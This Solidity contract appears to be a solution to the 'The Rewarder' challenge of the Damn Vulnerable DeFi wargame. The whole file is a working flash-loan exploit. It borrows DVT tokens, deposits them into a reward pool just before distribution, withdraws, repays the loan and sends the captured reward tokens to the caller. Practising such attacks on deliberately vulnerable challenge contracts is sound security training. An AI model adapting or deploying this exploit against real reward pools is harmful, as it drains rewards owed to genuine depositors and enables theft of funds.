// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract TheRewarderPoolExploiter {
    IERC20 DVT;
    FlashLoanerPool flashLoanerPool;
    TheRewarderPool rewarderPool;

    receive() external payable {}

    constructor(address dvt, address flashLoanerPoolAddress, address rewarderPoolAddress) {
        DVT = IERC20(dvt);
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
    }

    function exploit(uint256 amount) external {
        flashLoanerPool.flashLoan(amount);
        rewarderPool.distributeRewards();
        IERC20 rewardToken = rewarderPool.rewardToken();
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external payable {
        DVT.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        DVT.transfer(address(flashLoanerPool), amount);
    }
}